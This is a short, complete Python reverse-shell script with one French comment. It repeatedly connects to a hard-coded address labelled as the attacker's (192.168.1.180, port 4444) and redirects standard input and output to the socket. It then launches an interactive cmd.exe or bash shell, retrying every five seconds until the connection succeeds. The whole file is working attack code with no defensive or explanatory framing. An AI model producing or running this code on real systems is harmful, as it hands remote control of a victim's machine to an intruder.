import socket
import subprocess
import os
import time

attacker_ip = '192.168.1.180'
attacker_port = 4444

while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((attacker_ip, attacker_port))

        # Rediriger les entrées/sorties.
        os.dup2(sock.fileno(), 0)  # stdin
        os.dup2(sock.fileno(), 1)  # stdout
        os.dup2(sock.fileno(), 2)  # stderr

        if os.name == "nt":
            subprocess.call(["cmd.exe"])
        else:
            subprocess.call(["/bin/bash", "-i"])

        break
    except:
        time.sleep(5)

